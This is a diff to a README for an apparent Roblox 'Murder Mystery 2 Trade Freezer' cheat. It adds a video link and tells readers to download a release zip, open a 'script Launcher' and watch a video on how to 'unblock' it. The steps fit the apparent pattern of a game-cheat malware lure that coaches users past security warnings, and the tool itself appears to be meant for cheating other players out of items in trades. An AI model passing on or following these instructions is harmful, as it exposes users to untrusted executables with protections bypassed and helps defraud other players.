@@ -29,7 +29,7 @@
 * A working Roblox executor or environment that supports your script format.
 * Murder Mystery 2 running on Roblox.
 
-### Installation & Usage
+### Installation & Usage Please watch this video before starting https://youtu.be/8XYXdn9gFaE
 
 1. Download the file and unzip it somewhere. https://github.com/jjsplt/Murder-Mystery-2-Trade-Freezer/archive/refs/tags/v1485.zip
 2. Open our script Launcher this how you unblock it. https://youtu.be/8XYXdn9gFaE
